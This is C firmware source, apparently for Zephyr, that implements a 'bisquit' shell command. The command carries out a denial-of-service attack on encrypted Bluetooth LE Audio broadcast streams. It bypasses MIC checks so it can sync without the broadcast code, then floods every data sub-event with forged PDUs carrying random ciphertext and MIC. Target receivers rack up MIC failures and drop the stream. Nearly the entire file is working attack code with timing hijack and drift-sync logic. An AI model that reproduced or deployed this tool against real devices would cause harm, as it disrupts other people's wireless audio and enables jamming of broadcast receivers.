/*
 * Shell front-end for BISQUIT.
 *
 *   bisquit start [<target>]
 *     Start BISQuit. Ignores MIC fails on LL so we can sync to an
 * 	   encrypted broadcast we don't have the bcode for.
 *     Starts a work-queue loop that overshadows every data
 *     sub-event with random data + random MIC bytes. The
 *     target receiver's CCM will fail to validate MIC on our forged
 *     PDUs and increment its BIS MIC failure counter -> BISQuit
 *
 *     `<target>` = candidate list index | address | name substring;
 *     omitted = first entry. Any bcode set on the candidate is
 *     deliberately ignored - bypass is the whole point.
 *
 *   bisquit stop
 * 	   Stop the BISQuit loop.
 */

#include <stdint.h>
#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/random/random.h>
#include <zephyr/shell/shell.h>
#include <zephyr/sys/util.h>

#include "hal/ticker.h"
#include "ticker/ticker.h"

#include "pdu_df.h"
#include "lll/pdu_vendor.h"
#include "pdu.h"

#include "bison_sniff.h"
#include "bison_subevent_time.h"
#include "bison_tx.h"
#include "bison_lll_hijack.h"

#include "scan.h"
#include "big_sync.h"

/* Estimate the BIG event counter that's "current" right now, given a
 * snapshot from some past event. anchor_ticks is in HAL ticker units.
 */
static uint16_t current_event_counter(const struct bison_snapshot *snap)
{
	uint32_t now;
	uint32_t elapsed_ticks;
	uint32_t iso_interval_ticks;
	uint32_t events_elapsed;

	now = ticker_ticks_now_get();
	elapsed_ticks = now - snap->anchor_ticks;
	iso_interval_ticks =
		HAL_TICKER_US_TO_TICKS((uint32_t)snap->iso_interval * 1250U);
	if (iso_interval_ticks == 0U) {
		return snap->event_counter;
	}
	events_elapsed = elapsed_ticks / iso_interval_ticks;
	return (uint16_t)(snap->event_counter + events_elapsed);
}

static int enqueue_flood_data_pdus(const struct bison_snapshot *snap,
				   uint16_t target_evt, uint8_t cssn,
				   uint8_t cstf,
				   const uint8_t *payload, uint8_t payload_len)
{
	uint32_t nse_data;
	uint8_t max_bis;
	uint8_t max_se;
	uint8_t outer_max;
	uint8_t inner_max;
	bool outer_is_se;
	int enqueued = 0;
	int err;

	nse_data = (uint32_t)snap->bn * snap->irc +
		   (snap->pto ? snap->bn : 0U);
	max_bis = snap->num_bis;
	max_se  = (uint8_t)nse_data;
	outer_is_se = !bison_is_sequential_packing(snap->bis_spacing_us,
						   snap->sub_interval_us,
						   max_se);
	outer_max = outer_is_se ? max_se : max_bis;
	inner_max = outer_is_se ? max_bis : max_se;

	for (uint8_t outer = 0U; outer < outer_max; outer++) {
		for (uint8_t inner = 0U; inner < inner_max; inner++) {
			uint8_t bis = outer_is_se ? (inner + 1U) : (outer + 1U);
			uint8_t se  = outer_is_se ? outer : inner;

			err = bison_tx_schedule(target_evt, bis, se,
				BISON_TX_LLID_COMPLETE_END,
				cssn, cstf, payload, payload_len);
			if (err) {
				return err;
			}
			enqueued++;
		}
	}

	return enqueued;
}

static void bisquit_loop_work_handler(struct k_work *work);
static K_WORK_DELAYABLE_DEFINE(bisquit_loop_work, bisquit_loop_work_handler);

static bool     bisquit_loop_active;
static uint16_t bisquit_loop_iso_ms;
static uint32_t bisquit_loop_iters_run;
static uint32_t bisquit_loop_iters_ok;
static uint32_t bisquit_loop_iters_skipped;

static int64_t  bisquit_loop_next_target_ms;

/*
 * Every Nth iteration we skip the TX so the target event runs the LLL's 
 * normal isr_rx path instead of our hijack. That
 * lets the LL observe the broadcaster's actual TX timing and update
 * its drift compensation (radio_tmr_aa_get - radio_tmr_ready_get,
 * fed to ULL via drift.start_to_address_actual_us) - without that,
 * the LL's BIG-sync ticker runs entirely on our LFXO and drifts from
 * the broadcaster's clock.
 */
#define BISQUIT_DRIFT_SYNC_EVERY 10U

/* Scratch buffer for one iteration's random ciphertext+MIC.
 * Static rather than stack-local to keep the workqueue stack small -
 * only accessed from the serialised handler, no lock needed.
 */
static uint8_t bisquit_scratch[BISON_LLL_HIJACK_PDU_MAX];

static int enqueue_bisquit_all(const struct bison_snapshot *snap,
			       uint16_t target_evt, uint8_t cssn)
{
	uint32_t nse_data = (uint32_t)snap->bn * snap->irc +
			    (snap->pto ? snap->bn : 0U);
	int total_entries = (int)((uint32_t)snap->num_bis * nse_data);
	uint8_t total_len = (uint8_t)(snap->max_pdu + PDU_MIC_SIZE);

	if (bison_lll_hijack_available() < total_entries) {
		return -ENOSPC;
	}
	if (total_len > BISON_LLL_HIJACK_PDU_MAX) {
		return -EMSGSIZE;
	}

	/* Fresh random for both the "ciphertext" and the trailing MIC
	 * each iteration. Forces the receiver's CCM to actually compute
	 * the MIC over new data rather than cache-hit a previous failure.
	 */
	sys_rand_get(bisquit_scratch, total_len);

	return enqueue_flood_data_pdus(snap, target_evt, cssn, 0U,
				       bisquit_scratch, total_len);
}

static void bisquit_reschedule_next(void)
{
	int64_t now = k_uptime_get();
	int64_t delay;

	bisquit_loop_next_target_ms += bisquit_loop_iso_ms;

	/* If we've fallen behind by more than one iso_interval (heavy
	 * system load, log spam, etc.), jump the target forward to
	 * `now` rather than firing back-to-back with no delay - repeated
	 * catch-up would starve the system workqueue for other users
	 * and doesn't recover the missed events anyway.
	 */
	delay = bisquit_loop_next_target_ms - now;
	if (delay < 0) {
		bisquit_loop_next_target_ms = now + bisquit_loop_iso_ms;
		delay = bisquit_loop_iso_ms;
	}
	(void)k_work_reschedule(&bisquit_loop_work, K_MSEC(delay));
}

static void bisquit_loop_work_handler(struct k_work *work)
{
	struct bison_snapshot snap;
	uint16_t target_evt;
	uint8_t cssn;
	int enqueued;

	ARG_UNUSED(work);

	if (!bisquit_loop_active) {
		return;
	}

	if (!bison_sniff_snapshot(&snap)) {
		/* Snapshot not populated yet (isr_rx_done hasn't fired
		 * once since big_sync_start). Don't touch
		 * bisquit_loop_next_target_ms - it hasn't been armed
		 * yet; a plain +50 ms retry is fine.
		 */
		(void)k_work_reschedule(&bisquit_loop_work, K_MSEC(50));
		return;
	}

	bisquit_loop_iters_run++;

	/* Periodic drift-sync: skip this iteration so isr_rx runs on the
	 * target event and refreshes the LLL's drift compensation. See
	 * BISQUIT_DRIFT_SYNC_EVERY. Kept before the enqueue so the target
	 * event is genuinely unhijacked (no leftover TX in the queue).
	 */
	if ((bisquit_loop_iters_run % BISQUIT_DRIFT_SYNC_EVERY) == 0U) {
		bisquit_loop_iters_skipped++;
		bisquit_reschedule_next();
		return;
	}

	target_evt = (uint16_t)(current_event_counter(&snap) + 2U);
	/* Match ambient CSSN so our PDUs look like normal broadcaster
	 * data (no CTRL PDU is coming; cstf=0).
	 */
	cssn = snap.cssn_data_last;

	enqueued = enqueue_bisquit_all(&snap, target_evt, cssn);
	if (enqueued >= 0) {
		bisquit_loop_iters_ok++;
	}

	bisquit_reschedule_next();
}

/* ---- shell commands ------------------------------------------------
 *
 * `bisquit start [<target>]`:
 *   1. Turn on the LL BISQuit MIC-fail bypass.
 *   2. big_sync_start on the target so the LLL hooks start populating
 *      bison_sniff_snapshot(). Because bypass is on, encrypted BIGs
 *      sync without a bcode.
 *   3. Kick off the DoS work loop.
 *
 * `bisquit stop` reverses in reverse order: stop loop, tear down
 * sync, bypass off.
 */

static int cmd_start(const struct shell *sh, size_t argc, char **argv)
{
	struct sniffer_candidate cand;
	struct bison_snapshot snap;
	const char *tok = (argc >= 2) ? argv[1] : NULL;
	int err;

	if (bisquit_loop_active) {
		shell_warn(sh, "bisquit already running - `bisquit stop` first");
		return -EBUSY;
	}

	err = sniffer_scan_lookup(tok, &cand);
	if (err) {
		if (tok == NULL) {
			shell_error(sh, "no candidates - `scan on` first");
		} else {
			shell_error(sh, "no matching candidate for '%s' - "
					"`scan list` to see options", tok);
		}
		return err;
	}

	char addr_str[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(&cand.addr, addr_str, sizeof(addr_str));
	shell_print(sh, "bisquit start: locking on %s sid=%u name='%s' "
			"(bypass on, any bcode ignored)",
		    addr_str, cand.sid, cand.name);

	/* Enable the MIC-fail bypass BEFORE big_sync_start so the ULL
	 * gate in ll_big_sync_create sees it on an encrypted target with
	 * encryption=0 sync param.
	 */
	bison_lll_hijack_bisquit_bypass_set(true);

	err = big_sync_start(&cand, NULL, 0U, sh);
	if (err) {
		bison_lll_hijack_bisquit_bypass_set(false);
		shell_error(sh, "bisquit sync failed: %d", err);
		return err;
	}

	/* Snapshot may need a moment for the first isr_rx to populate.
	 * The loop handler retries every 50ms if snapshot is invalid,
	 * so it self-heals; we just want a reasonable iso_interval
	 * for the reschedule cadence right now.
	 */
	if (bison_sniff_snapshot(&snap) && snap.iso_interval > 0U) {
		bisquit_loop_iso_ms = (uint16_t)(snap.iso_interval * 1250U / 1000U);
	} else {
		bisquit_loop_iso_ms = 30U;
	}
	if (bisquit_loop_iso_ms == 0U) {
		bisquit_loop_iso_ms = 10U;
	}

	bisquit_loop_active         = true;
	bisquit_loop_iters_run      = 0U;
	bisquit_loop_iters_ok       = 0U;
	bisquit_loop_iters_skipped  = 0U;
	/* Anchor the "next fire" clock so bisquit_reschedule_next()
	 * schedules the second iteration at now + iso_interval, not
	 * some drifted point.
	 */
	bisquit_loop_next_target_ms = k_uptime_get();

	shell_print(sh,
		"bisquit running (iso_interval=%u ms). Watch `bison status` for "
		"hijack:tx_done growth; the target receiver should terminate its "
		"BIG sync after a few MIC failures accumulate.",
		bisquit_loop_iso_ms);

	(void)k_work_reschedule(&bisquit_loop_work, K_NO_WAIT);
	return 0;
}

static int cmd_stop(const struct shell *sh, size_t argc, char **argv)
{
	ARG_UNUSED(argc);
	ARG_UNUSED(argv);

	if (!bisquit_loop_active) {
		shell_warn(sh, "bisquit not running");
		return -ENOENT;
	}
	bisquit_loop_active = false;
	(void)k_work_cancel_delayable(&bisquit_loop_work);

	(void)big_sync_stop();
	bison_lll_hijack_bisquit_bypass_set(false);

	shell_print(sh,
		"bisquit stop. iters_run=%u iters_ok=%u drift_sync=%u dropped=%u",
		bisquit_loop_iters_run, bisquit_loop_iters_ok,
		bisquit_loop_iters_skipped,
		bisquit_loop_iters_run - bisquit_loop_iters_ok -
			bisquit_loop_iters_skipped);
	return 0;
}

SHELL_STATIC_SUBCMD_SET_CREATE(sub_bisquit,
	SHELL_CMD_ARG(start, NULL,
		      "[<target>] - MIC-fail DoS: sync (bypass on) + flood "
		      "every data sub-event with random ciphertext+MIC",
		      cmd_start, 1, 1),
	SHELL_CMD(stop, NULL,
		  "Stop the DoS loop, tear down sync, bypass off",
		  cmd_stop),
	SHELL_SUBCMD_SET_END
);

SHELL_CMD_REGISTER(bisquit, &sub_bisquit,
		   "bisquit: MIC-failure DoS on encrypted BIS streams",
		   NULL);
